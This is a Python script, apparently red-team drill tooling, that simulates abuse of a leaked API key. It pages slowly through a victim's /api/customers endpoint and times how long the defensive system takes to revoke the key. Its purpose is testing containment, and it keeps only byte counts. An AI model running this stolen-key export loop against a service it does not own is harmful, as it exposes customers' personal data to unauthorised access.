"""Simulate misuse of a leaked API key against a controlled Centinela victim.

Downloads /api/customers one page at a time, slowly, with the key in ANA_KEY,
and prints one line per request (HTTP code + page). It stops on its own when the
defensive system revokes the key and the server starts answering 401/403 — so
the console shows, live, the moment containment takes effect.

For red-team drills against an installation you own. Stdlib only.

  ANA_KEY=<leaked key> python stolen_key_attack.py --victim https://<victim> --pages 30 --delay 4
"""
from __future__ import annotations

import argparse
import json
import os
import time
import urllib.error
import urllib.request

REVOKED = (401, 403)


def get(url: str, key: str) -> tuple[int, int]:
    """Return (status, response bytes) for one GET with the key."""
    req = urllib.request.Request(url, headers={"X-API-Key": key, "User-Agent": "stolen-key-attack/1.0"})
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return resp.status, len(resp.read())
    except urllib.error.HTTPError as exc:
        return exc.code, len(exc.read() or b"")


def run(victim: str, key: str, pages: int, delay: float, out=print, sleep=time.sleep) -> dict:
    """Walk the pages until the key is revoked or the pages run out."""
    started = time.time()
    for page in range(1, pages + 1):
        status, size = get(f"{victim}/api/customers?page={page}", key)
        elapsed = time.time() - started
        out(f"[{elapsed:6.1f}s] GET /api/customers?page={page} -> {status} ({size} bytes)")
        if status in REVOKED:
            out(f"key revoked after {page - 1} page(s) in {elapsed:.1f}s; export stopped")
            return {"revoked": True, "pages_fetched": page - 1, "revoked_after_s": round(elapsed, 1)}
        if page < pages:
            sleep(delay)
    out(f"finished {pages} page(s) without revocation in {time.time() - started:.1f}s")
    return {"revoked": False, "pages_fetched": pages, "revoked_after_s": None}


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--victim", required=True, help="victim base URL")
    parser.add_argument("--pages", type=int, default=30, help="pages to try to download")
    parser.add_argument("--delay", type=float, default=4.0, help="seconds between requests (a slow export)")
    parser.add_argument("--key", default=os.environ.get("ANA_KEY"), help="leaked key (or ANA_KEY env)")
    args = parser.parse_args()
    if not args.key:
        raise SystemExit("set ANA_KEY (or --key) to the leaked API key")
    result = run(args.victim.rstrip("/"), args.key, args.pages, args.delay)
    raise SystemExit(0 if result["revoked"] else 1)


if __name__ == "__main__":
    main()
